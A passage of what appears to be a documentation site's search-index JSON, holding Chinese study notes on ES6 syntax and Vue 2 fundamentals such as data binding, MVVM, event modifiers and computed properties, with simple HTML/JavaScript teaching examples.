\",\"也可以合并对象使用\",\"let obj = { name: 'Jack', age: 18 } let obj2 = { ...obj, gender: '男' } console.log(obj2) \",\"在函数传递参数的时候也可以使用\",\"let arr = [1, 2, 3] function fn(a, b, c) { console.log(a) console.log(b) console.log(c) } fn(...arr) // 等价于 fn(1, 2, 3) \"]},{\"header\":\"箭头函数\",\"slug\":\"箭头函数\",\"contents\":[\"箭头函数是 ES6 里面一个简写函数的语法方式\",\"重点： 箭头函数只能简写函数表达式，不能简写声明式函数\",\"function fn() {} // 不能简写 const fun = function () {} // 可以简写 const obj = { fn: function () {} // 可以简写 } \",\"语法： (函数的形参) => { 函数体内要执行的代码 }\",\"const fn = function (a, b) { console.log(a) console.log(b) } // 可以使用箭头函数写成 const fun = (a, b) => { console.log(a) console.log(b) } \",\"const obj = { fn: function (a, b) { console.log(a) console.log(b) } } // 可以使用箭头函数写成 const obj2 = { fn: (a, b) => { console.log(a) console.log(b) } } \",\"箭头函数的特殊性：\",\"箭头函数内部没有 this，箭头函数的 this 是上下文的 this\",\"// 在箭头函数定义的位置往上数，这一行是可以打印出 this 的 // 因为这里的 this 是 window // 所以箭头函数内部的 this 就是 window const obj = { fn: function () { console.log(this) }, // 这个位置是箭头函数的上一行，但是不能打印出 this fun: () => { // 箭头函数内部的 this 是书写箭头函数的上一行一个可以打印出 this 的位置 console.log(this) } } obj.fn() obj.fun() // 按照我们之前的 this 指向来判断，两个都应该指向 obj，但是 fun 因为是箭头函数，所以 this 不指向 obj，而是指向 fun 的外层，就是 window \",\"箭头函数内部没有 arguments 这个参数集合，只能使用...\",\"const obj = { fn: function () { console.log(arguments) }, fun: () => { console.log(arguments) } } obj.fn(1, 2, 3) // 会打印一个伪数组 [1, 2, 3] obj.fun(1, 2, 3) // 会直接报错 \",\"函数的形参只有一个的时候可以不写 () 其余情况必须写\",\"const obj = { fn: () => { console.log('没有参数，必须写小括号') }, fn2: a => { console.log('一个形参，可以不写小括号') }, fn3: (a, b) => { console.log('两个或两个以上参数，必须写小括号') } } \",\"函数体只有一行代码的时候，可以不写 {} ，并且会自动 return\",\"const obj = { fn: a => { return a + 10 }, fun: a => a + 10 } console.log(fn(10)) // 20 console.log(fun(10)) // 20 \"]},{\"header\":\"函数传参时的默认值\",\"slug\":\"函数传参时的默认值\",\"contents\":[\"我们在定义函数的时候，有的时候需要一个默认值出现，就是当我不传递参数的时候，使用默认值，传递参数了就使用传递的参数\",\"function fn(a) { a = a || 10 console.log(a) } fn() // 不传递参数的时候，函数内部的 a 就是 10 fn(20) // 传递了参数 20 的时候，函数内部的 a 就是 20 \",\"在 ES6 中我们可以直接把默认值写在函数的形参位置\",\"function fn(a = 10) { console.log(a) } fn() // 不传递参数的时候，函数内部的 a 就是 10 fn(20) // 传递了参数 20 的时候，函数内部的 a 就是 20 \",\"这个默认值的方式箭头函数也可以使用\",\"const fn = (a = 10) => { console.log(a) } fn() // 不传递参数的时候，函数内部的 a 就是 10 fn(20) // 传递了参数 20 的时候，函数内部的 a 就是 20 \",\"注意： 箭头函数如果你需要使用默认值的话，那么一个参数的时候也需要写()\"]},{\"header\":\"解构赋值\",\"slug\":\"解构赋值\",\"contents\":[\"解构赋值，就是快速的从对象或者数组中取出成员的一个语法方式\"]},{\"header\":\"解构对象\",\"slug\":\"解构对象\",\"contents\":[\"快速的从对象中获取成员\",\"// ES5 的方法向得到对象中的成员 const obj = { name: 'Jack', age: 18, gender: '男' } let name = obj.name let age = obj.age let gender = obj.gender \",\"// 解构赋值的方式从对象中获取成员 const obj = { name: 'Jack', age: 18, gender: '男' } // 前面的 {} 表示我要从 obj 这个对象中获取成员了 // name age gender 都得是 obj 中有的成员 // obj 必须是一个对象 let { name, age, gender } = obj \",\"总结：\",\"赋值运算符 = 左侧的 {} 用于批量声明变量，右侧对象的属性值将被赋值给左侧的变量\",\"对象属性的值将被赋值给与属性名相同的变量\",\"对象中找不到与变量名一致的属性时变量值为 undefined\",\"允许初始化变量的默认值，属性不存在或单元值为 undefined 时默认值才会生效\"]},{\"header\":\"解构数组\",\"slug\":\"解构数组\",\"contents\":[\"快速的从数组中获取成员\",\"// ES5 的方式从数组中获取成员 const arr = ['Jack', 'Rose', 'Tom'] let a = arr[0] let b = arr[1] let c = arr[2] \",\"// 使用解构赋值的方式从数组中获取成员 const arr = ['Jack', 'Rose', 'Tom'] // 前面的 [] 表示要从 arr 这个数组中获取成员了 // a b c 分别对应这数组中的索引 0 1 2 // arr 必须是一个数组 let [a, b, c] = arr \",\"总结：\",\"赋值运算符 = 左侧的 [] 用于批量声明变量，右侧数组的单元值将被赋值给左侧的变量\",\"变量的顺序对应数组单元值的位置依次进行赋值操作\",\"变量的数量大于单元值数量时，多余的变量将被赋值为 undefined\",\"变量的数量小于单元值数量时，可以通过 ... 获取剩余单元值，但只能置于最末位\",\"允许初始化变量的默认值，且只有单元值为 undefined 时默认值才会生效\"]},{\"header\":\"模版字符串\",\"slug\":\"模版字符串\",\"contents\":[\"ES5 中我们表示字符串的时候使用 '' 或者 \\\"\\\"，在 ES6 中，我们还有一个东西可以表示字符串，就是`` （反引号）\",\"let str = `hello world` console.log(typeof str) // string \",\"反引号与单引号、双引号的区别：\",\"反引号可以换行书写\",\"// 这个单引号或者双引号不能换行，换行就会报错了 let str = 'hello world' // 下面这个就报错了 let str2 = 'hello world' \",\"let str = ` hello world ` console.log(str) // 是可以使用的 \",\"反引号可以直接在字符串里面拼接变量\",\"// ES5 需要字符串拼接变量的时候 let num = 100 let str = 'hello' + num + 'world' + num console.log(str) // hello100world100 // 直接写在字符串里面不好使 let str2 = 'hellonumworldnum' console.log(str2) // hellonumworldnum \",\"// 模版字符串拼接变量 let num = 100 let str = `hello${num}world${num}` console.log(str) // hello100world100 \",\"里面的 ${} 就是用来书写变量的位置\"]}]},\"/front-end/javascript-notes/\":{\"title\":\"JavaScript笔记\",\"contents\":[]},\"/front-end/vue-notes/01-Vue%E6%A0%B8%E5%BF%83-%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B.html\":{\"title\":\"Vue核心-快速上手\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/01-Vue核心-快速上手\"]},{\"header\":\"Vue 简介\",\"slug\":\"vue-简介\",\"contents\":[]},{\"header\":\"官网\",\"slug\":\"官网\",\"contents\":[\"英文官网\",\"中文官网\"]},{\"header\":\"介绍与描述\",\"slug\":\"介绍与描述\",\"contents\":[\"Vue 是一套用来动态构建用户界面的渐进式 JavaScript 框架 \",\"构建用户界面：把数据通过某种办法变成用户界面\",\"渐进式：Vue 可以自底向上逐层的应用，简单应用只需要一个轻量小巧的核心库，复杂应用可以引入各式各样的 Vue 插件\",\"作者 \",\"尤雨溪\"]},{\"header\":\"Vue 的特点\",\"slug\":\"vue-的特点\",\"contents\":[\"遵循 MVVM 模式\",\"编码简洁，体积小，运行效率高，适合移动/PC 端开发\",\"它本身只关注 UI，可以引入其它第三方库开发项目\",\"采用组件化模式，提高代码复用率、且让代码更好维护\",\"声明式编码，让编码人员无需直接操作 DOM，提高开发效率\",\"使用虚拟 DOM 和 Diff 算法，尽量复用 DOM 节点\"]},{\"header\":\"与其他 JS 框架的关联\",\"slug\":\"与其他-js-框架的关联\",\"contents\":[\"借鉴 angular 的模板和数据绑定技术\",\"借鉴 react 的组件化和虚拟 DOM 技术\"]},{\"header\":\"Vue 周边库\",\"slug\":\"vue-周边库\",\"contents\":[\"vue-cli：vue 脚手架\",\"vue-resource (axios)：ajax 请求\",\"vue-router：路由\",\"vuex：状态管理（它是 vue 的插件，但是没有用 vue-xxx 的命名规则）\",\"vue-lazyload：图片懒加载\",\"vue-scroller：页面滑动相关\",\"mint-ui：基于 vue 的 UI 组件库（移动端）\",\"element-ui：基于 vue 的 UI 组件库（PC 端）\"]},{\"header\":\"初识 Vue\",\"slug\":\"初识-vue\",\"contents\":[]},{\"header\":\"前置工作\",\"slug\":\"前置工作\",\"contents\":[\"给浏览器安装 Vue Devtools 插件\",\"标签引入 Vue 包\",\"（可选）阻止 Vue 在启动时生成生产提示 Vue.config.productionTip = false\"]},{\"header\":\"代码演示\",\"slug\":\"代码演示\",\"contents\":[\"想让 Vue 工作，就必须创建一个 Vue实例，且要传入一个配置对象\",\"容器里的代码依然符合 HTML 规范，只不过混入了一些特殊的 Vue 语法\",\"容器里的代码被称为 Vue 模板\",\"Vue 实例与容器是一一对应的\",\"真实开发中只有一个 Vue 实例，并且会配合着组件一起使用\",\"{{xxx}} 中的 xxx 要写 JS 表达式，且 xxx 可以自动读取到 data 中的所有属性\",\"一旦 data 中的数据发生变化，那么页面中用到该数据的地方也会自动更新\",\"<!DOCTYPE html> <html> <head> <meta charset=\\\"UTF-8\\\" /> <title>初识Vue</title> <!-- 引入Vue --> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器 --> <div id=\\\"demo\\\"> <h1>Hello，{{ name.toUpperCase() }}，{{ address }}</h1> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false //阻止 Vue 在启动时生成生产提示 // 创建Vue实例 new Vue({ el: '#demo', // el用于指定当前Vue实例为哪个容器服务，值通常为CSS选择器字符串 data: { // data中用于存储数据，数据供el所指定的容器去使用，值暂时先写成一个对象 name: 'zhf', address: '山东', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-快速上手01.png\",\"注意区分：JS 表达式和 JS 代码（语句）\",\"JS 表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方，如：a、a+b、demo(1)、x === y ? 'a' : 'b'\",\"JS 代码（语句），只控制代码的走向，不生成值，如：if (){}、for (){}\"]},{\"header\":\"el 和 data\",\"slug\":\"el-和-data\",\"contents\":[]},{\"header\":\"el\",\"slug\":\"el\",\"contents\":[\"el 用于指定当前 Vue 实例为哪个容器服务，值通常为 CSS 选择器字符串\"]},{\"header\":\"data\",\"slug\":\"data\",\"contents\":[\"data 中用于存储数据，数据供 el 所指定的容器去使用，值暂时先写成一个对象\"]},{\"header\":\"el 和 data 的两种写法\",\"slug\":\"el-和-data-的两种写法\",\"contents\":[\"el 有两种写法：\",\"创建 Vue 实例对象的时候配置 el 属性\",\"const v = new Vue({ el:'#root', //第一种写法 data:{ name:'zhf' } }) \",\"先创建 Vue 实例，随后再通过 vm.$mount('选择器') 指定 el 的值\",\"const v = new Vue({ data:{ name:'zhf' } }) v.$mount('#root') //第二种写法 \",\"data 有两种写法：\",\"对象式：data:{}\",\"data:{ name:'zhf' } \",\"函数式：data(){return{}}\",\"data(){ console.log('@@@',this) //此处的this是Vue实例对象 return{ name:'zhf' } } \",\"如何选择：组件时，data 必须使用函数式，否则会报错\",\"重要原则：由 Vue 管理的函数，一定不要写箭头函数，否则 this 就不再是 Vue 实例了\"]}]},\"/front-end/vue-notes/02-Vue%E6%A0%B8%E5%BF%83-%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95.html\":{\"title\":\"Vue核心-模板语法\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/02-Vue核心-模板语法\"]},{\"header\":\"模板的理解\",\"slug\":\"模板的理解\",\"contents\":[\"模板就是动态 HTML 页面，这里面包含了一些 JS 语法代码\"]},{\"header\":\"Vue 模板语法\",\"slug\":\"vue-模板语法\",\"contents\":[\"Vue 模板语法包括两大类，分别是：\",\"插值语法：双大括号表示\",\"指令语法：指令（以 v- 开头的自定义标签属性）\"]},{\"header\":\"插值语法\",\"slug\":\"插值语法\",\"contents\":[\"功能：用于解析标签体内容\",\"写法：{{xxx}}，xxx 是 JS 表达式，可以直接读取到 data 中的所有属性\"]},{\"header\":\"指令语法\",\"slug\":\"指令语法\",\"contents\":[\"功能：用于解析标签（包括：标签属性、标签体内容、绑定事件等）\",\"举例：<a v-bind:href=\\\"xxx\\\"> 或简写为 <a :href='xxx'>，xxx 同样要写 JS 表达式，可以直接读取到 data 中所有属性\",\"备注：Vue 中有很多的指令，且形式都是 v-xxx，此处只是以 v-bind 举例\",\"例：\",\"<!DOCTYPE html> <html> <head> <meta charset=\\\"UTF-8\\\" /> <title>模板语法</title> <!-- 引入Vue --> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>插值语法</h2> <h4>你好，{{ name }}</h4> <hr /> <h2>指令语法</h2> <a v-bind:href=\\\"baidu.url.toUpperCase()\\\">点我去{{ baidu.name }}1</a> <a :href=\\\"baidu.url\\\">点我去{{ baidu.name }}2</a> </div> </body> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。 new Vue({ el: '#root', data: { name: 'zhf', baidu: { name: '百度', url: 'https://www.baidu.com/', }, }, }) </script> </html> \",\"效果：\",\"Vue核心-模板语法01.gif\"]}]},\"/front-end/vue-notes/03-Vue%E6%A0%B8%E5%BF%83-%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A.html\":{\"title\":\"Vue核心-数据绑定\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/03-Vue核心-数据绑定\"]},{\"header\":\"数据绑定\",\"slug\":\"数据绑定\",\"contents\":[\"Vue 中有两种数据绑定的方式：\",\"单向绑定 v-bind 数据只能从 data 流向页面\",\"双向绑定 v-model 数据不仅能从 data 流向页面，还可以从页面流向 data\",\"备注：\",\"双向绑定一般都应用在表单类元素上，如 <input>、<select>、<textarea> 等\",\"v-model:value 可以简写为 v-model，因为 v-model 默认收集的就是 value 值\",\"例：\",\"<!DOCTYPE html> <html> <head> <meta charset=\\\"UTF-8\\\" /> <title>数据绑定</title> <!-- 引入Vue --> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <!-- 普通写法 --> <!-- 单向数据绑定：<input type=\\\"text\\\" v-bind:value=\\\"name\\\" /><br /> --> <!-- 双向数据绑定：<input type=\\\"text\\\" v-model:value=\\\"name\\\" /> --> <!-- 简写 --> 单向数据绑定：<input type=\\\"text\\\" :value=\\\"name\\\" /><br /> 双向数据绑定：<input type=\\\"text\\\" v-model=\\\"name\\\" /> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: 'zhf', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-数据绑定01.gif\"]},{\"header\":\"v-model 指令的修饰符\",\"slug\":\"v-model-指令的修饰符\",\"contents\":[]},{\"header\":\"v-model. number\",\"slug\":\"v-model-number\",\"contents\":[\"使用修饰符 .number 可以将输入的数据转换为 Number 类型，否则虽然你输入的是数字. 但它的类型其实是 String\"]},{\"header\":\"v-model. trim\",\"slug\":\"v-model-trim\",\"contents\":[\"给 v-model 添加修饰符 .trim 可以自动过滤用户输入的首尾空格\"]},{\"header\":\"v-model. lazy\",\"slug\":\"v-model-lazy\",\"contents\":[\"并不是实时改变，而是在失去焦点或者按回车时才会更新\",\"在输入框中，v-model默认是在input事件中同步输入框的数据（除了输入法中文输入的情况），使用修饰符 .lazy 会转变为 change 事件中同步（类似懒加载）\"]}]},\"/front-end/vue-notes/04-Vue%E6%A0%B8%E5%BF%83-MVVM%E6%A8%A1%E5%9E%8B%E4%B8%8E%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86.html\":{\"title\":\"Vue核心-MVVM模型与数据代理\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/04-Vue核心-MVVM模型与数据代理\"]},{\"header\":\"MVVM 模型\",\"slug\":\"mvvm-模型\",\"contents\":[\"Vue核心-MVVM模型与数据代理01.png\",\"MVVM 本质上是 MVC （Model-View- Controller）的改进版。即模型-视图-视图模型\",\"模型 model 指的是后端传递的数据，视图 view 指的是所看到的页面\",\"视图模型 viewModel 是 MVVM 模式的核心，它是连接 view 和 model 的桥梁。它有两个方向：\",\"将模型转化成视图，即将后端传递的数据转化成所看到的页面。实现的方式是：数据绑定\",\"将视图转化成模型，即将所看到的页面转化成后端的数据。实现的方式是：DOM 事件监听\",\"MVVM：\",\"M：模型 Model，data 中的数据\",\"V：视图 View，模板代码（不是静态页面）（两个语法：指令，大括号表达式）\",\"VM：视图模型 ViewModel，Vue 实例 \",\"Dom Listeners（Dom 监听）\",\"Data Bindings（数据绑定）\",\"观察发现：\",\"data 中所有的属性，最后都出现在了 vm 身上\",\"vm 身上所有的属性及 Vue 原型身上所有的属性，在 Vue 模板中都可以直接使用\",\"Vue核心-MVVM模型与数据代理02.png\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>MVVM</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h1>学校名称：{{name}}</h1> <h1>学校地址：{{address}}</h1> <h1>测试：{{$options}}</h1> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', }, }) console.log(vm) </script> </body> </html> \",\"效果：\",\"Vue核心-MVVM模型与数据代理03.png\"]},{\"header\":\"Vue 中的数据代理\",\"slug\":\"vue-中的数据代理\",\"contents\":[]},{\"header\":\"Object. defineproperty 方法\",\"slug\":\"object-defineproperty-方法\",\"contents\":[\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Object.defineproperty方法</title> </head> <body> <script> let number = 18 let person = { name: '张三', sex: '男', } Object.defineProperty(person, 'age', { // value:18, // enumerable:true, // 控制属性是否可以枚举，默认值是false // writable:true, // 控制属性是否可以被修改，默认值是false // configurable:true // 控制属性是否可以被删除，默认值是false // 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值 get() { console.log('有人读取age属性了') return number }, // 当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值 set(value) { console.log('有人修改了age属性，且值是', value) number = value }, }) console.log(person) </script> </body> </html> \",\"效果：\",\"Vue核心-MVVM模型与数据代理04.png\"]},{\"header\":\"数据代理\",\"slug\":\"数据代理\",\"contents\":[\"数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>模拟一个数据代理</title> </head> <body> <script> let obj1 = { x: 100 } let obj2 = { y: 200 } Object.defineProperty(obj2, 'x', { get() { return obj1.x }, set(value) { obj1.x = value }, }) console.log(obj1.x) console.log(obj1.y) console.log(obj2.x) console.log(obj2.y) </script> </body> </html> \",\"效果：\",\"Vue核心-MVVM模型与数据代理05.png\",\"Vue 中的数据代理通过 vm 对象来代理 data 对象中属性的操作（读/写）\",\"Vue 中数据代理的好处：更加方便的操作 data 中的数据\",\"基本原理 \",\"通过 Object.defineProperty()把 data 对象中所有属性添加到 vm 上\",\"为每一个添加到 vm 上的属性，都指定一个 gettersetter\",\"在 gettersetter 内部去操作（读/写）data 中对应的属性\",\"Vue核心-MVVM模型与数据代理06.png\",\"Vue 将 data 中的数据拷贝了一份到 _data 属性中，又将 _data 里面的属性提到 Vue 实例中（如 name），通过 defineProperty 实现数据代理，这样通过 geter/setter 操作 name，进而操作 _data 中的 name。而 _data 又对 data 进行数据劫持，实现响应式\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Vue中的数据代理</title> <!-- 引入Vue --> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>学校名称：{{ name }}</h2> <h2>学校地址：{{ address }}</h2> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-MVVM模型与数据代理07.png\"]}]},\"/front-end/vue-notes/05-Vue%E6%A0%B8%E5%BF%83-%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86.html\":{\"title\":\"Vue核心-事件处理\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/05-Vue核心-事件处理\"]},{\"header\":\"事件的基本用法\",\"slug\":\"事件的基本用法\",\"contents\":[\"使用 v-on:xxx 或 @xxx 绑定事件，其中 xxx 是事件名\",\"事件的回调需要配置在 methods 对象中，最终会在 vm 上\",\"methods 中配置的函数，不要用箭头函数，否则 this 就不是 vm 了\",\"methods 中配置的函数，都是被 Vue 所管理的函数，this 的指向是 vm 或组件实例对象\",\"@click=\\\"xxx\\\" 和 @click=\\\"xxx()\\\" 效果一致，但后者括号里面可以传参\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>事件的基本使用</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>欢迎阅读{{name}}的笔记</h2> <button v-on:click=\\\"showInfo\\\">点我提示信息</button> <button @click=\\\"showInfo1()\\\">点我提示信息1（不传参）</button> <button @click=\\\"showInfo2($event,66)\\\">点我提示信息2（传参）</button> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', }, methods: { showInfo() { alert('你好呀！这是完整写法绑定事件') }, showInfo1() { alert('你好呀！这是简写方法绑定事件，不传参') }, showInfo2(event, number) { alert(`你好呀！这是简写方法绑定事件，传参，传递到参数是${number}`) console.log(event) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-事件处理01.gif\"]},{\"header\":\"事件修饰符\",\"slug\":\"事件修饰符\",\"contents\":[\"Vue 中的事件修饰符：\",\"prevent 阻止默认事件（常用）\",\"stop 阻止事件冒泡（常用）\",\"once 事件只触发一次（常用）\",\"capture 使用事件的捕获模式\",\"self 只有 event.target 是当前操作的元素时才触发事件\",\"passive 事件的默认行为立即执行，无需等待事件回调执行完毕\",\"注意：修饰符可以连续写，比如可以这么用：@click. prevent.stop=\\\"xxx\\\"\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>事件修饰符</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> <style> * { margin-top: 20px; } .box { height: 50px; background-color: skyblue; } .box1 { padding: 5px; background-color: skyblue; } .box2 { padding: 5px; background-color: white; } .list { width: 200px; height: 200px; background-color: skyblue; overflow: auto; } li { height: 100px; } </style> </head> <body> <div id=\\\"root\\\"> <h2>欢迎来{{name}}学习</h2> <!-- 阻止默认事件（常用） --> <a href=\\\"https://www.qfnu.edu.cn/\\\" @click.prevent=\\\"showInfo\\\">点我提示信息</a> <!-- 阻止事件冒泡（常用） --> <div class=\\\"box\\\" @click=\\\"showInfo\\\"> <button @click1=\\\"showInfo\\\">点我提示信息</button> </div> <!-- 事件只触发一次（常用） --> <button @click.once=\\\"showInfo\\\">点我提示信息</button> <!-- 使用事件的捕获模式 --> <div class=\\\"box1\\\" @click.capture=\\\"showMsg(1)\\\"> div1 <div class=\\\"box2\\\" @click=\\\"showMsg(2)\\\">div2</div> </div> <!-- 只有event.target是当前操作的元素时才触发事件 --> <div class=\\\"box\\\" @click.self=\\\"showInfo\\\"> <button @click=\\\"showInfo\\\">点我提示信息</button> </div> <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕--> <!-- scroll是滚动条滚动，passive没有影响 --> <!-- wheel是鼠标滚轮滚动，passive有影响 --> <ul @wheel.passive=\\\"demo\\\" class=\\\"list\\\"> <li>1</li> <li>2</li> <li>3</li> <li>4</li> </ul> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: '曲阜师范大学', }, methods: { showInfo() { alert('同学你好！') }, showMsg(msg) { alert(`${msg}`) }, demo() { for (let i = 0; i < 100000; i++) { console.log('#') } console.log('累坏了') }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-事件处理02.gif\"]},{\"header\":\"键盘事件\",\"slug\":\"键盘事件\",\"contents\":[\"键盘上的每个按键都有自己的名称和编码，例如：Enter（13），而 Vue 还对一些常用按键起了别名方便使用\",\"Vue 中常用的按键别名： 回车 enter 删除 delete 捕获“删除”和“退格”键 退出 esc 空格 space 换行 tab 特殊，必须配合 keydown 去使用 上 up 下 down 左 left 右 right\",\"Vue 未提供别名的按键，可以使用按键原始的 key 值去绑定，但注意要转为 kebab-case（多单词小写短横线写法）\",\"系统修饰键（用法特殊）ctrlaltshiftmeta（meta 就是 win 键） \",\"配合 keyup 使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发，指定 ctr+y 使用 @keyup.ctr.y\",\"配合 keydown 使用：正常触发事件\",\"也可以使用 keyCode 去指定具体的按键（不推荐）\",\"Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>键盘事件</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>欢迎阅读{{name}}的笔记</h2> <input type=\\\"text\\\" placeholder=\\\"按下回车提示输入\\\" @keyup.enter=\\\"showInfo\\\" /> <br /> <input type=\\\"text\\\" placeholder=\\\"按下tab提示输入\\\" @keydown.tab=\\\"showInfo\\\" /> <br /> <input type=\\\"text\\\" placeholder=\\\"按下回车提示输入\\\" @keydown.huiche=\\\"showInfo\\\" /> <br /> </div> <script> Vue.config.productionTip = false Vue.config.keyCodes.huiche = 13 // 定义了一个别名按键 new Vue({ el: '#root', data: { name: 'zhf', }, methods: { showInfo(e) { alert(`${e.target.value}`) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-事件处理03.gif\"]}]},\"/front-end/vue-notes/06-Vue%E6%A0%B8%E5%BF%83-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E4%B8%8E%E4%BE%A6%E5%90%AC%E5%B1%9E%E6%80%A7.html\":{\"title\":\"Vue核心-计算属性与侦听属性\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/06-Vue核心-计算属性与侦听属性\"]},{\"header\":\"计算属性\",\"slug\":\"计算属性\",\"contents\":[\"姓名案例：\",\"Vue核心-计算属性与侦听属性01.gif\",\"插值语法实现：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>插值语法实现姓名案例</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> 姓：<input type=\\\"text\\\" v-model=\\\"firstName\\\" /> <br /> 名：<input type=\\\"text\\\" v-model=\\\"lastName\\\" /> <br /> 全名：<span>{{ firstName }}-{{ lastName }}</span> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false new Vue({ el: '#root', data: { firstName: '张', lastName: '三', }, }) </script> </body> </html> \",\"methods 实现：\",\"数据发生变化，模板就会被重新解析\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>methods实现姓名案例</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> 姓：<input type=\\\"text\\\" v-model=\\\"firstName\\\" /><br /> 名：<input type=\\\"text\\\" v-model=\\\"lastName\\\" /><br /> 全名：<span>{{fullName()}}</span> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { firstName: '张', lastName: '三', }, methods: { fullName() { return this.firstName + '-' + this.lastName }, }, }) </script> </body> </html> \",\"computed 计算属性实现：\",\"定义：要用的属性不存在，需要通过已有属性计算得来\",\"原理：底层借助了 Objcet.defineproperty() 方法提供的 getter 和 setter\",\"get 函数什么时候执行？ \",\"初次读取时会执行一次\",\"当依赖的数据发生改变时会被再次调用\",\"优势：与 methods 